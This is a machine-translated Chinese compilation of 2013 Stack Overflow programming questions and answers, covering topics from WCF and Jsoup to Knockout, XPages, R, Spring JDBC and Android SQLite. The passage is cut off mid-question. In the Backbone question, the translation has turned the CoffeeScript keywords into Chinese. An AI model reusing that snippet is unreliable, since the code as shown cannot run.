所以我仍然无法让[autocompleteextender](/questions/tagged/autocompleteextender "显示标记为“自动完成扩展器”的问题")与我的 WCF 服务一起使用，但我确实想出了如何修复`EndPoint Not Found`错误。

所以这里有三件事我没有完全理解或忽视。

1.  Microsoft 的 WCF 客户端测试实用程序仅测试 SOAP 请求。
2.  所有不同的绑定如何工作以及它们的含义。
3.  您需要确保将正确的帐户用于 IIS 中的匿名用户身份。

对于项目**#1**和**#2**，我需要添加另一个端点来处理使用[basichttpbinding](/questions/tagged/basichttpbinding "显示标记为“basichttpbinding”的问题")或[wshttpbinding](/questions/tagged/wshttpbinding "显示标记为“wshttpbinding”的问题")的肥皂请求。我只指定了一个绑定，即[webhttpbinding](/questions/tagged/webhttpbinding "显示标记为“webhttpbinding”的问题")，尽管这给了我浏览器中的温暖模糊，但它本质上导致 WCF 客户端实用程序无法工作，因为我基本上没有定义任何 SOAP 端点。[在此处](https://stackoverflow.com/questions/2650785/basichttpbinding-vs-wshttpbinding-vs-webhttpbinding)阅读有关差异的更多信息。

至于**第 3**项，我在[这里](http://www.iis.net/configreference/system.webserver/security)找到了答案。花了好几天的时间整理有关更改 web.config 的帖子，用用户名和密码编写代码以启用和禁用 IIS 中人类已知的每种形式的身份验证类型。这就是最终的诀窍，让我可以使用 WCF 客户端测试实用程序而不会出现讨厌的`EndPoint Not Found`错误。

另外，对于那些感兴趣的人，我实际上已经开始了一篇新文章，专门关注[ajaxcontroltookkit](/questions/tagged/ajaxcontroltookkit "显示标记为“ajaxcontroltookkit”的问题") [autocompleteextender](/questions/tagged/autocompleteextender "显示标记为“自动完成扩展器”的问题")问题，可以在[这里](https://stackoverflow.com/questions/15282625/method-not-allowed-error-when-calling-wcf-method-from-ajaxcontroltoolkit-autocom?lq=1)找到。

仅供参考：我已经设法从我的 WCF 服务返回相同的**JSON**数据，这些数据看起来就像从 ASPX 的 CodeBehind 页面执行代码并且实际工作时返回的 JSON 数据......但对于某些人**来说**使用 WCF 方法时没有自动完成的原因。在使用 WCF 服务方法时，我注意到的唯一不同之处在于，在获取带有**JSON**数据的甜蜜 http 200 消息之前，总是会出现一个 http 401 身份验证错误。

# java - Jsoup - 一一阅读

> ID：15163343
> 
> 赞同：0
> 
> 时间：2013-03-01T17:22:46.423
> 
> 标签：java, html, html-parsing, jsoup

我最近开始使用 Jsoup。我需要在 HTML 源代码中列出一些元素。例如：

```
 <table class="list">
    <tr>
        <td class="year" colspan="5">2012</td>
    </tr>
    <tr>
        <td class="code">COMP0348</td>
        <td class="name">Software Engineering</td>
    </tr>
    <tr>
        <td class="code">COMP0734</td>
        <td class="name">System Information</td>
    </tr>
    <td class="year" colspan="5">2013</td>
    </tr>
    <tr>
        <td class="code">COMP999</td>
        <td class="name">Windows</td>
    </tr>
</table> 
```

**这就是我要的：**

```
2012 
Comp0348 Software Engineering
COMP0734 System Information
2013
COMP999 Windows 
```

但是在我的代码中，它不是一个一个列出，它列出了一个字符串，其中首先包含所有“年份”，然后在另一行中包含所有“代码”，然后在另一行中列出所有“名称”。喜欢：

```
2012 
Comp0348 COMP0734 COMP999
Software Engineering System Information Windows 
```

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T21:47:12.427

我猜你只按标准选择标签，而不是结构。

但请看这里：

```
Document doc = ...

Element table = doc.select("table.list").first(); // select the table

for( Element element : table.select("tr") ) // select all 'tr' of the table
{
    final Elements td = element.select("td.year"); // select the 'td' with 'year' class

    if( !td.isEmpty() ) // if it's the one with the 'year' class
    {
        final String year = td.first().text(); // get year

        System.out.println(year);
    }
    else // if it's another 'tr' tag containing the 'code' and 'name' element
    {
        final String code = element.select("td.code").first().text(); // get code
        final String name = element.select("td.name").first().text(); // get name

        System.out.println(code + " " + name);
    }
} 
```

**输出（使用您的 html）：**

```
2012
COMP0348 Software Engineering
COMP0734 System Information
2013
COMP999 Windows 
```

# knockout.js - 获取 data-bind="text: ko.toJSON($root) 以在 UI 输入更改时刷新

> ID：15163348
> 
> 赞同：0
> 
> 时间：2013-03-01T17:22:59.523
> 
> 标签：knockout.js

当绑定到视图模型的 UI 输入发生更改时，让它自动更新的最佳方法是什么。

```
<div style="word-wrap: break-word" data-bind="text: ko.toJSON($root)"></div> 
```

编辑***_ _* __ *_* __ *_* __ *_* ____**

```
 var ViewModel = (function () {
    function ViewModel(json) {
        this.Foo= ko.observableArray(json.Foo);

    }
    return ViewModel;
})();
var viewModel = new ViewModel(rawJson);
$(document).ready(function () {
    ko.applyBindings(viewModel);
}); 
```

# xpages - 从页面级别获取属性/参数

> ID：15163351
> 
> 赞同：1
> 
> 时间：2013-03-01T17:23:12.713
> 
> 标签：xpages, xpages-ssjs

我想知道是否可以通过编程方式获取 xpage 或自定义控件的参数和/或属性。

```
<xp:view xmlns:xp="http://www.ibm.com/xsp/core" id="layout">

<xp:this.properties>
    <xp:parameter name="testcc.xsp" value="Test 1"></xp:parameter>
    <xp:parameter name="index.xsp" value="Main"></xp:parameter>
</xp:this.properties>
... 
```

如何访问此参数列表以在重复控制中使用它？

**编辑** 你们都是对的，谢谢！但这仅适用于页面，不适用于自定义控件。

**编辑**

你们俩都很棒:-)

但是：我应该修改我的问题：我有一个自定义控件，我在其中定义了属性。在 SAMe 自定义控件中，我想在重复控件中访问这些属性。

您的两个答案似乎都假设对这些属性的访问来自视图（页面）级别，对吗？

我测试了 Svens 方式 - 如果我从页面级别访问 CC 中的道具，则此方法有效。

**编辑**

所以这是CC的代码：

```
<?xml version="1.0" encoding="UTF-8"?>
<xp:view xmlns:xp="http://www.ibm.com/xsp/core">

<xp:this.properties>
    <xp:parameter name="param" value="val"></xp:parameter>
</xp:this.properties>

<xp:label value="#{javascript:facesContext.getProperty('param')}"
    id="label1">
</xp:label>

</xp:view> 
```

如您所见，我只想访问 CC itselt 中的属性，而不是从页面级别访问。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-01T17:47:06.097

您可以通过访问*facesContext*来获取属性：

```
facesContext.getProperty("index.xsp") 
```

**编辑：**

如果在自定义控件中设置属性，则不会将属性添加到视图根。它们被设置为自定义控件 ( *com.ibm.xsp.component.UIIncludeComposite* ) 的属性。

要访问它们，您首先必须为您的 CC 提供一个 ID：

```
<xc:ccProp id="myId" /> 
```

*这允许您使用getComponent()*方法像访问组件一样访问自定义控件并检索包含属性的属性*属性*：

```
<xp:label id="labelProperty">
    <xp:this.value><![CDATA[#{javascript:
        var cc:com.ibm.xsp.component.UIIncludeComposite = getComponent("myId");
        var arrList:java.util.ArrayList = cc.getAttributes().get("properties");
        arrList.get(0).getName()}]]>
    </xp:this.value>
</xp:label> 
```

**编辑2：**

如果您不想为 CC 提供 ID，则可以通过这种方式访问​​ CC（在此示例中是标签的父级）：

*自定义控件的代码：*

```
<?xml version="1.0" encoding="UTF-8"?>
<xp:view xmlns:xp="http://www.ibm.com/xsp/core">

    <xp:this.properties>
        <xp:parameter name="param" value="val"></xp:parameter>
    </xp:this.properties>

    <xp:label id="label1">
        <xp:this.value><![CDATA[#{javascript:
            this.parent.getAttributes().get("properties").get(0).getName()
       }]]></xp:this.value>
   </xp:label>

    <xp:label id="label2">
        <xp:this.value><![CDATA[#{javascript:
            this.parent.getAttributes().get("properties").get(0).getValue()
       }]]></xp:this.value>
   </xp:label>

</xp:view> 
```

希望这有助于澄清问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T17:48:54.890

要获取属性列表，您可以使用`view.getProperties()`. 它返回一个对象`java.util.List`，您可以使用该对象循环各个属性（它们是 的对象`com.ibm.xsp.complex.Parameter`）。下面是片段。

```
var allProperties:java.util.List = view.getProperties();
for (var i=0 ; i<allProperties.size() ; i++) {
    var property:com.ibm.xsp.complex.Parameter = allProperties.get(i);

    // property.getName();
    // property.getValue();
} 
```

如果你想重复它，那么你可以将它绑定到`view.getProperties()`然后获取它的各个值。您的代码将如下所示：

```
<xp:repeat rows="30" value="#{javascript:view.getProperties()}" var="property">
    <xp:text escape="true">
        <xp:this.value><![CDATA[#{javascript:property.getName() + " - " + property.getValue();}]]></xp:this.value>
    </xp:text>
    <xp:br></xp:br>
</xp:repeat> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-02T20:07:53.553

如果您有想要在 Xpage 的各个部分使用的值，无论是直接在页面上、在自定义控件中还是在重复中，我建议您将这些值放入 sessionScope 变量中。这使您可以在用户在 Xpage 上输入信息时轻松更改它们。

例如，`sessionScope.PODocUNID = poDoc.getDocument().getUniversalID();`将我正在使用的采购订单文档的 UNID 放入名为 PODocUNID 的 sessionScope 变量中。然后，您可以随时通过简单地在代码中引用 sessionScope.PODocUNID 来提取值。

或者，您可以使用 Russ Maher 目前最喜欢的玩具 Managed Bean（参见他关于 Notes in 9 的三部分视频，从以下网址开始：http: [//notesin9.com/index.php/2012/11/02/notesin9-084 -shared-managed-beans-in-xpages/](http://notesin9.com/index.php/2012/11/02/notesin9-084-sharing-managed-beans-in-xpages/) )

# backbone.js - 为什么为这个主干视图定义了 el undefined 和 $el ？

> ID：15163353
> 
> 赞同：4
> 
> 时间：2013-03-01T17:23:20.313
> 
> 标签：backbone.js, coffeescript

我很困惑为什么 '''el''' 在这里未定义，而 $el 已定义。

![未定义的](../Images/315e5fd75deacbe69f5f20e16b9488d6.png)

背景是对 CoffeeScript 的实验，如下所示：

```
类 FastTodo.Views.AddTodoItem 扩展 Backbone.View

  模板：JST['todo_items/add_item']

  el: $('#main')

  渲染：->
    console.log("渲染")
    console.log($("#main"))
    控制台日志（@el）
    控制台日志（@）
    $(@el).html @模板

  初始化：->
    @使成为（）

```

在这种情况下如何渲染视图？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-01T17:35:23.623

尝试将元素声明重写为`el: '#main'`

我认为这对你应该很有效。

顺便说一句，根据您的控制台日志，jQuery 元素 ($el) 也是空的。您必须在标记完全加载之前声明视图。通过`el`为元素提供选择器，您可以确保仅在文档准备好（加载）时才获取它。

# javascript - 淘汰嵌套视图模型

> ID：15163354
> 
> 赞同：18
> 
> 时间：2013-03-01T17:23:30.023
> 
> 标签：javascript, knockout.js

我坚持必须是一个简单的修复。我正在使用带有嵌套视图模型的 knockout.js，除了我的删除功能无法正常工作之外，一切似乎都很好。它似乎正确绑定，但是当我单击删除时它不会被触发。

为什么要嵌套视图模型？长话短说，但基本上很多东西都需要在一页上！

所以这里是代码：

**HTML**

```
<section class="mini-form-container">
    <form data-bind="submit: repeatGuest.addDate">
        <input type="date" data-bind="value: repeatGuest.previousStay"/>
        <button type="submit" class="button-secondary ">Add date</button>
    </form>
    <div data-bind="foreach: repeatGuest.dates, visible: repeatGuest.dates().length > 0">
        <div>
            <input data-bind="value: date" disabled="disabled"  />
            <a data-bind="click: $parent.removeDate">Remove</a>
        </div>
    </div>
</section>

<section>
    <div data-bind="text: ko.toJSON($data)"></div>
</section> 
```

**Javascript**

```
function RepeatGuest() {
    /// <summary>Child View Model</summary>
    this.dates = ko.observableArray();
    this.previousStay = ko.observable();
}

RepeatGuest.prototype.addDate = function () {
        var self = this.repeatGuest;
        if (self.previousStay()) {
            self.dates.push({
                date: self.previousStay()
            });
        }
    };

RepeatGuest.prototype.removeDate = function (date) {
    this.dates.remove(date);
}

function ViewModel() {
    var self = this;
    self.repeatGuest = new RepeatGuest();
}
ko.applyBindings(new ViewModel()); 
```

这是我的小提琴：http: [//jsfiddle.net/6Px4M/2/](http://jsfiddle.net/6Px4M/2/)

那么为什么我的删除功能没有被触发呢？

*可能的问题：嵌套视图模型是否是淘汰赛的错误路径，这似乎没有太多信息？*

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2013-03-01T17:40:05.043

使用这样的嵌套模型的最佳方法之一是使用`with`绑定。你可以做：

```
<div data-bind="with: repeatGuest">
   ...
</div> 
```

现在，范围是你的`repeatGuest`，你可以直接绑定它的属性。

您的`remove`职能问题与当时的价值`this`和身份有关`$parent`。函数以`this`等于当前作用域的值执行。绑定删除函数时，范围是`date`数组中的对象之一。

处理此问题的典型方法是确保您的函数必须始终使用正确的`this`. 这可以在绑定（非常丑陋）中完成，例如：

```
<a data-bind="click: $parent.repeatGuest.removeDate.bind($parent.repeatGuest)">Remove</a> 
```

更好的选择是将它绑定在视图模型中，在您的`RepeatGuest`构造函数中：

```
this.removeDate = this.removeDate.bind(this); 
```

这允许实现存在于原型上，并在每个实例上使用强制正确值的包装器覆盖它`this`。或者，如果你不把它放在原型上，那么你可以使用`var self = this;`模式并`self`在处理程序中使用。

[http://jsfiddle.net/cNdJj/](http://jsfiddle.net/cNdJj/)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-01T17:35:10.550

绑定不会访问错误原型上的函数。您现在绑定到 viewModel，而不是 RepeatGuest 对象。

如果您将其设置为本地函数，它将起作用：

[http://jsfiddle.net/6Px4M/3/](http://jsfiddle.net/6Px4M/3/)

```
function ViewModel() {
    var self = this;
    self.repeatGuest = new RepeatGuest();
    self.removeDate = function (date) {
        self.repeatguest.dates.remove(date);
    }
} 
```

# r - R使用样本创建具有随机数的矩阵列

> ID：15163355
> 
> 赞同：2
> 
> 时间：2013-03-01T17:23:33.223
> 
> 标签：r, matrix

在这个网站上的人的帮助下，我有一个`y`看起来与此类似的矩阵（但更简化了）。

```
1,3
1,3
1,3
7,1
8,2
8,2 
```

我创建了第三列生成随机数（不使用此代码替换每个重复块`j=cbind(y,sample(1:99999,y[,2],replace=FALSE))`。

矩阵`j`看起来像这样：

```
1,3,4520
1,3,7980
1,3,950
7,1,2
8,3,4520
8,3,7980
8,3,950 
```

如何为我的第三列获得真正的随机数，以便对于每个重复行，即 3，然后是 1，然后是 2，我得到一个在该重复部分 ( `replace = FALSE`) 中未复制的随机数？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-01T17:32:52.733

**为什么会这样：**

问题是`sample`命令结构是：

```
sample(vector of values, how many?, replace = FALSE or TRUE) 
```

在这里，“有多少？” 应该是一个值。由于您提供了 的第二列的全部内容`y`，因此它只选择第一个值，`3`因此它读作：

```
set.seed(45) # just for reproducibility
sample(1:99999, 3, replace = F) 
```

对于这个种子，值是：

```
# [1] 63337 31754 24092 
```

而且由于只有 3 个值，因此您将其绑定到具有 6 行的矩阵，它会“回收”这些值（意思是，它以相同的顺序重复这些值）。所以，你得到：

```
#      [,1] [,2]  [,3]
# [1,]    1    3 63337
# [2,]    1    3 31754
# [3,]    1    3 24092
# [4,]    7    1 63337
# [5,]    8    2 31754
# [6,]    8    2 24092 
```

看到值重复。对于您显示的矩阵，我不知道它是如何`7,1,2`发生的。作为矩阵的第一个值`y[,2] = 3`。

**你应该怎么做：**

```
y <- cbind(y, sample(1:99999, nrow(y), replace = FALSE)) 
```

这要求在不替换的情况下`sample`生成（此处）值。`nrow(y) = 6`这将生成长度为 6 的不相同的值，并将绑定到您的 matrix `y`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T19:09:13.157

没有循环我无法得到这个。也许其他人可以获得更优雅的解决方案。对我来说，问题是在组内重复采样，组间不重复采样

```
ll <- split(dat, paste(dat$V1,dat$V2,sep=''))
ll.length <- by(dat, paste(dat$V1,dat$V2,sep=''),nrow)
z <- rep(0,nrow(dat))  

SET <- seq(1,100)  ## we can change 100 by 99999 for example
v =1
for (i in seq_along(ll)){
  SET <- SET[is.na(match(z,SET))]
  nn   <- nrow(ll[[i]]) 
  z[v:(v+nn-1)] <- sample(SET,nn,rep=TRUE) 
  v <- v+nn
}

 z
[1]  35  77  94 100  23  59 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-01T18:41:36.280

这应该可以得到你想要的：

```
j <- cbind(y, unlist(sapply(unique(y[,2]), function(n) sample(1:99999, n)))) 
```

编辑：代码中有错误。当然需要功能`unique`。

# javascript - 如何从页面加载中调用 ajax 点击事件？

> ID：15163356
> 
> 赞同：2
> 
> 时间：2013-03-01T17:23:33.353
> 
> 标签：javascript, jquery, javascript-events

我有一个单击事件，当我单击一个按钮时会触发它，它会打开一个模态界面：

```
$(".profileF2fClinicalServiceDetails").live("click", function(){
    var requestUrl = '/php/includes/ajax.php?operation=profile_edit_f2f_clinical_service_details&service=f2f&counsellor_id='+getPractitionerId($(this))+'&counsellor_address_id='+getAddressId($(this))+'&edit_level='+getEditLevel($(this))+'&tab='+getTab($(this));
    openDialog(requestUrl, "Edit Face to Face Service Details", 850, "location.replace(getCleanedLocationHref()+'&tab="+getTab($(this))+"');");
    return false;
}); 
```

但是现在我想在页面加载时提示它被触发，我如何直接从 HTML 调用它？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T17:26:01.050

将 click 事件中的代码添加到名为的独立函数（而不是闭包）中，例如`showPopup`. 然后将点击事件绑定的函数改为 call `showPopup`，并`showPopup`在页面加载时添加对函数的调用。

注意，从 1.7 开始，jQuery 的`live`函数已被弃用，您应该`on`改用 ( [source](http://api.jquery.com/live/) )

您必须将一些参数传递给函数，因为您将无法`this`在初始调用期间使用。第一次调用主函数时，您必须将这些参数传递给它，我不会猜测您将如何确定它。

当点击事件被触发时，您可以按照您当前使用的方式从元素中提取参数。你会有这样的事情：

```
$(document).ready(function() {
    // add the click event
    $(".profileF2fClinicalServiceDetails").on("click", function () {
        var Me = $(this);
        showPopup(
            getPractitionerId(Me),
            getAddressId(Me),
            getEditLevel(Me),
            getTab(Me)
        );
    });

    // call the function right away
    showPopup(
        [initial_counsellor_id],
        [initial_address_id],
        [initial_level],
        [initial_tab]
    );
});

function showPopup(counsellor_id, address_id, level, tab) {
    var requestUrl = '/php/includes/ajax.php?operation=profile_edit_f2f_clinical_service_details&service=f2f&counsellor_id='+counsellor_id+'&counsellor_address_id='+address_id+'&edit_level='+level+'&tab='+tab;
    openDialog(
        requestUrl,
        "Edit Face to Face Service Details",
        850,
        "location.replace(getCleanedLocationHref()+'&tab="+tab+"');"
    );
    return false;
} 
```

**文档和相关阅读**

*   `jQuery.ready`- [http://api.jquery.com/ready/](http://api.jquery.com/ready/)
*   `jQuery.on`- [http://api.jquery.com/on/](http://api.jquery.com/on/)
*   `jQuery.live`- [http://api.jquery.com/live/](http://api.jquery.com/live/) [**已弃用**]
*   MDN 上的 Javascript 函数 - [https://developer.mozilla.org/en-US/docs/JavaScript/Guide/Functions](https://developer.mozilla.org/en-US/docs/JavaScript/Guide/Functions)

# spring - spring jdbc.query() 建议

> ID：15163364
> 
> 赞同：0
> 
> 时间：2013-03-01T17:24:14.650
> 
> 标签：spring, spring-mvc, spring-jdbc

我需要执行以下查询并获取列表对象。各位大佬知道怎么取回最好`spring jdbc`吗？

这是 SQL 查询：

```
SELECT app_name, error_code, error_message FROM error_message
WHERE ( 
    (app_name = ? AND error_code = ?) OR 
    (app_name = ? AND error_code = ?) OR 
    (app_name = ? AND error_code = ?) OR 
    (app_name = ? AND error_code = ?) OR 
    (app_name = ? AND error_code = ?) 
) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T18:19:42.493

这是我的示例代码：

```
String sql = yoursql;

Object args[] = new Object[3];
args[0] = yourparam1;          
args[1] = yourparam2;          
args[2] = yourparam3;

getJdbcTemplate().query(sql, args, yourRowMapper); 
```

您应该为 rowmapper 添加以下代码。

```
private RowMapper yourRowMapper= new YourRowMapperClass ();

public final class YourRowMapperClass implements RowMapper {
   public Object mapRow(ResultSet rs, int rowNum) throws SQLException {

      YourResponse model = new YourResponse ();
      model.setresp1(rs.getDate(1));
      model.setresp2(rs.getDate(2));
      model.setresp3(rs.getString(3));

      return model;
    }
  } 
```

顺序对于指定参数很重要。例如，如果我们在 sql 中两次使用 searchType 参数，我们应该定义如下参数：

```
Object args[] = new Object[4];
args[0] = searchType;
args[1] = param1;
args[2] = searchType;
args[3] = param2; 
```

如果我们为您定制示例，您可以使用以下代码：

```
Object args[] = new Object[10];
args[0] = appname;
args[1] = errorcode;
args[2] = appname;
args[3] = errorcode;
args[4] = appname;
args[5] = errorcode;
args[6] = appname;
args[7] = errorcode;
args[8] = appname;
args[9] = errorcode; 
```

# python - 如何使用单行原始输入将多个整数存储在数组中？

> ID：15163365
> 
> 赞同：0
> 
> 时间：2013-03-01T17:24:18.687
> 
> 标签：python, arrays, raw-input

```
FirstName = raw_input("Please enter your first name: ")
Scores = map(int, raw_input("Please enter your four golf scores: ").split())
print "Score analysis for %s:" % FirstName
print "Your golf scores are: " + Scores
print "The lowest score is " + min(Scores)
print "The highest score is" +max(Scores) 
```

我正在尝试将我用 C++ 编写的基本程序转换为 python，我想输入一个由 4 个整数组成的数组，然后计算最小值、最大值和其他一些东西。我希望用户能够输入“70 71 72 73”之类的四个分数，然后将这四个分数存储为四个整数的数组（列表？）。

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T17:29:02.323

我在运行您的代码时看到的错误是关于输出的字符串格式，而不是输入的读取。一种更正代码的方法如下所示。我将字符串+列表错误更改为使用`print`语句的逗号。我将两个 string+int 错误更改为使用字符串插值。

```
FirstName = raw_input("Please enter your first name: ")
Scores = map(int, raw_input("Please enter your four golf scores: ").split())
print "Score analysis for %s:" % FirstName
print "Your golf scores are:", Scores
print "The lowest score is %d" % min(Scores)
print "The highest score is %d" % max(Scores) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T17:39:48.030

您可以使用以下任一格式更改第 4 行：

```
print "Your golf scores are: ", Scores 
```

或者

```
print "Your golf scores are: "+ str(Scores) 
```

# android - 如何解析foursquare类别json

> ID：15163368
> 
> 赞同：1
> 
> 时间：2013-03-01T17:24:29.677
> 
> 标签：android, json, arrays

基本上我想做的是通过使用类别从foursquare过滤场地，但我想让用户选择他们想要的那种“过滤器”，但到目前为止我无法正确解析json。

原始的 json 数据，例如

```
{
"meta": {
"code": 200
},
 "response": {
"categories": [
  {
    "id": "4d4b7104d754a06370d81259",
    "name": "Arts & Entertainment",
    "pluralName": "Arts & Entertainment",
    "shortName": "Arts & Entertainment",
    "icon": {
      "prefix": "https:\/\/foursquare.com\/img\/categories_v2\/arts_entertainment\/default_",
      "suffix": ".png"
    },
    "categories": [
      {
        "id": "4fceea171983d5d06c3e9823",
        "name": "Aquarium",
        "pluralName": "Aquariums",
        "shortName": "Aquarium",
        "icon": {
          "prefix": "https:\/\/foursquare.com\/img\/categories_v2\/arts_entertainment\/aquarium_",
          "suffix": ".png"
        },
        "categories": [

        ]
      },
      {
        "id": "4bf58dd8d48988d1e1931735",
        "name": "Arcade",
        "pluralName": "Arcades",
        "shortName": "Arcade",
        "icon": {
          "prefix": "https:\/\/foursquare.com\/img\/categories_v2\/arts_entertainment\/arcade_",
          "suffix": ".png"
        },
        "categories": [

        ]
      },
      {
        "id": "4bf58dd8d48988d1e2931735",
        "name": "Art Gallery",
        "pluralName": "Art Galleries",
        "shortName": "Art Gallery",
        "icon": {
          "prefix": "https:\/\/foursquare.com\/img\/categories_v2\/arts_entertainment\/artgallery_",
          "suffix": ".png"
        },
        "categories": [

        ]
      },
      {
        "id": "4bf58dd8d48988d1e4931735",
        "name": "Bowling Alley",
        "pluralName": "Bowling Alleys",
        "shortName": "Bowling Alley",
        "icon": {
          "prefix": "https:\/\/foursquare.com\/img\/categories_v2\/arts_entertainment\/bowling_",
          "suffix": ".png"
        },
        "categories": [

        ]
      },
      {
        "id": "4bf58dd8d48988d17c941735",
        "name": "Casino",
        "pluralName": "Casinos",
        "shortName": "Casino",
        "icon": {
          "prefix": "https:\/\/foursquare.com\/img\/categories_v2\/arts_entertainment\/casino_",
          "suffix": ".png"
        },
        "categories": [

        ]
      },
      {
        "id": "4bf58dd8d48988d18e941735",
        "name": "Comedy Club",
        "pluralName": "Comedy Clubs",
        "shortName": "Comedy Club",
        "icon": {
          "prefix": "https:\/\/foursquare.com\/img\/categories_v2\/arts_entertainment\/comedyclub_",
          "suffix": ".png"
        },
        "categories": [

        ]

 bla bla bla 
```

并使用我现在拥有的代码如下：

```
 JSONObject jsonObj  = new JSONObject(response);
             jsonObj = jsonObj.getJSONObject("response");
             JSONArray groups;//    = (JSONArray) jsonObj.getJSONObject("response").getJSONArray("Categories);
             groups = jsonObj.getJSONArray("categories");

             FileOutputStream fos = WhereToEatLehActivity.this.openFileOutput("file_name"+".txt",Context.MODE_PRIVATE);
                Writer out = new OutputStreamWriter(fos);
                out.write(jsonObj.toString());
                out.close();
             int length          = jsonObj.length();

             if (length > 0) {

                 for (int i = 0; i < length; i++) {
                     JSONObject aCat    = (JSONObject) groups.get(i);
                     Log.d("category", aCat.toString());
                     if(aCat.getString("name").equalsIgnoreCase("Food")){
                         Log.d("food", aCat.getString("id"));
                     }

                 } 
```

通过检查运行输出的 txt 文件，我的 json 如下：

```
 "categories": [
{
  "id": "4d4b7104d754a06370d81259",
  "icon": {
    "suffix": ".png",
    "prefix": "https:\/\/foursquare.com\/img\/categories_v2\/arts_entertainment\/default_"
  },
  "categories": [
    {
      "id": "4fceea171983d5d06c3e9823",
      "icon": {
        "suffix": ".png",
        "prefix": "https:\/\/foursquare.com\/img\/categories_v2\/arts_entertainment\/aquarium_"
      },
      "categories": [

      ],
      "shortName": "Aquarium",
      "pluralName": "Aquariums",
      "name": "Aquarium"
    },
    {
      "id": "4bf58dd8d48988d1e1931735",
      "icon": {
        "suffix": ".png",
        "prefix": "https:\/\/foursquare.com\/img\/categories_v2\/arts_entertainment\/arcade_"
      },
      "categories": [

      ],
      "shortName": "Arcade",
      "pluralName": "Arcades",
      "name": "Arcade"
    }, 
```

从那里开始，json数据已经是错误的，因为json数据被修剪得太多以至于我不能使用这个名字，但我不知道我做错了什么，任何指针？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T17:30:19.270

改变

```
 int length  = jsonObj.length(); 
```

到

```
 int length = groups.length(); 
```

使用里面的项目数`JsonArray`而不是`JsonObject`for 循环条件

# css - 加载 twitter bootstrap responsive.css 时如何防止特定元素的响应行为？

> ID：15163372
> 
> 赞同：1
> 
> 时间：2013-03-01T17:24:38.177
> 
> 标签：css, twitter-bootstrap

假设我有一个网格元素：

```
<div class="row">
  <div class="span4">...</div>
  <div class="span5">...</div>
</div> 
```

![水平对齐的 div](../Images/f518315ad90bb0758c57f6bfeb6589ed.png)

当我在普通桌面屏幕上`.span4`并且`.span5`水平对齐时。但是，当屏幕较小时，假设电话两个 div 都*“垂直”堆叠起来*

![水平对齐的 div](../Images/397b0214074996205db55d644cc78f83.png)

这真的很棒，但我想防止这种情况发生在特定的 div 上。它有足够的空间来保持水平布局。

**注意** 总是有可能创建我自己的非响应式 .span (.myspan2, myspan4,...) 但除此之外还有 **懒惰的解决方案**吗？我不想为整个项目中的一个元素添加 8 行代码。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T17:29:15.717

您可以将媒体查询写入特定分辨率的 div 以安排您的布局。喜欢

```
 /* Large desktop */
@media (min-width: 1200px) { write your styles here  }

/* Portrait tablet to landscape and desktop */
@media (min-width: 768px) and (max-width: 979px) { write your styles here  }

/* Landscape phone to portrait tablet */
@media (max-width: 767px) { write your styles here  }

/* Landscape phones and down */
@media (max-width: 480px) { write your styles here  } 
```

# reporting-services - 在 SSRS 上的 MDX 查询中对度量使用过滤器

> ID：15163377
> 
> 赞同：6
> 
> 时间：2013-03-01T17:25:00.707
> 
> 标签：reporting-services, filter, mdx, cube, measure

我在我的数据集上使用多维数据集作为数据源和 MDX 查询创建了一个报告。我的数据集中有一些测量值，但我想使用 OR 过滤器（测量值 1 > 0 或测量值 2 > 0 ..etc）之类的方法仅显示具有至少一个测量值 > 0 的行我该怎么做?

谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-02T04:05:12.640

使用该`Filter()`子句来约束行的成员集：

```
SELECT
  [Measures].[Internet Sales Amount] ON COLUMNS,
  Filter(
    [Customer].[Country].Members, 
    ([Measures].[Internet Sales Amount] > 2000000) 
        AND ([Measures].[Internet Sales Amount] < 5000000)
  ) ON ROWS
FROM [Adventure Works]; 
```

# android - android sqlite多次搜索记录

> ID：15163379
> 
> 赞同：0
> 
> 时间：2013-03-01T17:25:21.443
> 
> 标签：android, sqlite

我正在开发一个症状检查器 android 应用程序，用户可以在其中检查他可能有的许多症状。请检查我到目前为止所做的尝试：

```
 public String getData(String[] symptoms) {
    String search = "";
    Cursor c = myDataBase.query(DB_TABLE, new String[] 
            {KEY_CONDITIONS}, KEY_SYMPTOMS + "= ? ", symptoms, null, null, null);

    c.moveToFirst();

    while (c.isAfterLast() == false) {
        search += c.getString(0) + ", ";
        c.moveToNext();
    }

    return search;

} 
```

但我需要动态生成 where 字符串，因为我不知道会选择多少症状。我将如何做到这一点？您的帮助将不胜感激。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T17:32:42.430

诀窍是您的数组中的*每个字符串都***必须**有*一个*插入字符 ( `?`) 。

 *一种解决方案是使用循环：

```
String where = KEY_SYMPTOMS + " = ?";
String relation = " OR "; /* Maybe " AND "? */

StringBuilder builder = new StringBuilder(where);
for(int i = 1; i < symptoms.length; i++)
    builder.append(relation).append(where);

Cursor c = myDataBase.query(DB_TABLE, new String[] 
        {KEY_CONDITIONS}, builder.toString(), symptoms, null, null, null); 
```

您还可以编写一个更短但等效的循环：

```
while (c.moveToNext())
    search += c.getString(0) + ", ";  // A StringBuilder should be faster 
```*

# ruby - 如何使用正则表达式选择这三个扩展名中的任何一个后的所有字符？

> ID：15163382
> 
> 赞同：0
> 
> 时间：2013-03-01T17:25:40.490
> 
> 标签：ruby, regex

我的测试字符串：

```
http://website.me/stuffs/5715?vars= 
```

所以我的网址可以是`website.com`, `website.me`, 或`website.dev`.

我基本上想要一个正则表达式语句来捕获这部分之后的所有内容：

```
